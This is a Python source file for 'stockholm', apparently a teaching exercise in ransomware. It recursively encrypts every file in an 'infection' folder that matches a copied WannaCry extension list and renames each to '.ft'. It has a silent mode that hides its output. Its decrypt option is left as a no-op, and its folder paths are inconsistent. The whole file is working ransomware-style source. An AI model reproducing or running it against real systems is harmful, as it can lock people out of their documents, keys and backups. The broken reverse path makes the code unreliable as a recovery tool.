import argparse
import os
import sys
import base64
from dotenv import load_dotenv
from nacl.secret import SecretBox
from nacl.utils import random
from nacl.exceptions import CryptoError

Args = argparse.Namespace
Parser = argparse.ArgumentParser

HEADER = """
 @@@@@@   @@@@@@@   @@@@@@    @@@@@@@  @@@  @@@  @@@  @@@   @@@@@@   @@@       @@@@@@@@@@   
@@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@       @@@@@@@@@@@  
!@@         @@!    @@!  @@@  !@@       @@!  !@@  @@!  @@@  @@!  @@@  @@!       @@! @@! @@!  
!@!         !@!    !@!  @!@  !@!       !@!  @!!  !@!  @!@  !@!  @!@  !@!       !@! !@! !@!  
!!@@!!      @!!    @!@  !@!  !@!       @!@@!@!   @!@!@!@!  @!@  !@!  @!!       @!! !!@ @!@  
 !!@!!!     !!!    !@!  !!!  !!!       !!@!!!    !!!@!!!!  !@!  !!!  !!!       !@!   ! !@!  
     !:!    !!:    !!:  !!!  :!!       !!: :!!   !!:  !!!  !!:  !!!  !!:       !!:     !!:  
    !:!     :!:    :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!   :!:      :!:     :!:  
:::: ::      ::    ::::: ::   ::: :::   ::  :::  ::   :::  ::::: ::   :: ::::  :::     ::   
:: : :       :      : :  :    :: :: :   :   :::   :   : :   : :  :   : :: : :   :      :    
                                                                                            
    """


class Color:
    HEADER = "\033[36m"
    INFO = "\033[96m"
    SUCCESS = "\033[92m"
    WARNING = "\033[93m"
    ERROR = "\033[91m"
    RESET = "\033[0m"


def print_header() -> None:
    for line in HEADER.splitlines():
        print(Color.HEADER + "{:^90}".format(line) + Color.RESET)


# fmt: off
wannacry_extensions: set[str] = {
    ".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2", ".docb",
    ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk", ".docm", ".potm",
    ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif", ".dot", ".pst", ".sldm",
    ".bmp", ".avi", ".pl", ".dbf", ".stc", ".dotm", ".ost", ".vdi", ".png",
    ".asf", ".vb", ".db", ".sxc", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg",
    ".vbs", ".mdb", ".ots", ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1",
    ".accdb", ".ods", ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sql",
    ".sqlitedb", ".max", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js",
    ".sqlite3", ".3ds", ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc",
    ".uot", ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw", ".xlm",
    ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw", ".xlc", ".123", ".bak",
    ".svg", ".sh", ".cpp", ".mml", ".ott", ".xltx", ".wks", ".tar", ".djvu",
    ".class", ".c", ".sxm", ".odt", ".xltm", ".wk1", ".tgz", ".m4u", ".jar",
    ".cs", ".otg", ".pem", ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg",
    ".p12", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr", ".pptm",
    ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt", ".pot", ".snt",
    ".zip", ".flv", ".php", ".mdf", ".sxd", ".key", ".pps", ".hwp", ".backup",
    ".3g2", ".jsp", ".ibd", ".otp", ".pfx", ".ppsm", ".602", ".iso", ".mkv", ".brd",
    ".myi", ".odp", ".der", ".ppsx", ".sxi",
}  # fmt: on


def get_master_key() -> str:
    key = os.getenv("MASTER_KEY")
    if key:
        return key
    load_dotenv("../.env")
    key = os.getenv("MASTER_KEY")
    if not key:
        raise ValueError("MASTER_KEY not found in .env file")
    return key


def parse_args() -> Args:
    parser: Parser = argparse.ArgumentParser(
        prog="stockholm",
        description="Encrypts and decrypts files using the wannacry algorithm",
    )
    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version="%(prog)s 0.5",
        help="Show program's version",
    )
    parser.add_argument(
        "-r",
        "--reverse",
        type=str,
        default=None,
        help="Decrypt files with the following key",
    )
    parser.add_argument("-s", "--silent", action="store_true", help="Silent mode")
    return parser.parse_args()


class Stockholm:
    def __init__(self, master_key: str):
        self.master_key_b64 = base64.urlsafe_b64encode(
            master_key.encode().ljust(24, b"\0")
        ).decode()
        self.box = SecretBox(self.master_key_b64.encode())

    def encrypt(self):
        path = os.path.expanduser("~/infection")

        if not os.path.exists(path):
            path = "../infection"
            if not os.path.exists(path):
                raise ValueError("Target directory not found")

        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(tuple(wannacry_extensions)):
                    file_path = os.path.join(root, file)
                    print(f"{Color.INFO}Encrypting {file_path}...{Color.RESET}")

                    with open(file_path, "r+b") as f:
                        data = f.read()
                        encrypted_data = self.box.encrypt(data)

                        f.seek(0)
                        f.write(encrypted_data)
                        f.truncate()

                    if not file_path.endswith(".ft"):
                        os.rename(file_path, file_path + ".ft")

    def decrypt(self):
        path = os.path.expanduser("~/infection")

        if not os.path.exists(path):
            path = "./infection"
            if not os.path.exists(path):
                raise ValueError("Target directory not found")

        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(".ft"):
                    file_path = os.path.join(root, file)
                    print(f"{Color.SUCCESS}Decrypting {file_path}...{Color.RESET}")

                    with open(file_path, "rb") as f:
                        encrypted_data = f.read()
                        decrypted_data = self.box.decrypt(encrypted_data)

                    with open(file_path, "wb") as f:
                        f.write(decrypted_data)

                    os.rename(file_path, file_path[:-3])


def main() -> None:
    try:
        master_key = get_master_key()
        args: Args = parse_args()
        if args.silent:
            sys.stdout = open(os.devnull, "w")
        print_header()
        stockholm = Stockholm(master_key)
        if args.reverse:
            pass
        else:
            stockholm.encrypt()
    except Exception as e:
        print(f"{Color.ERROR}Error: {e}{Color.RESET}")


if __name__ == "__main__":
    main()
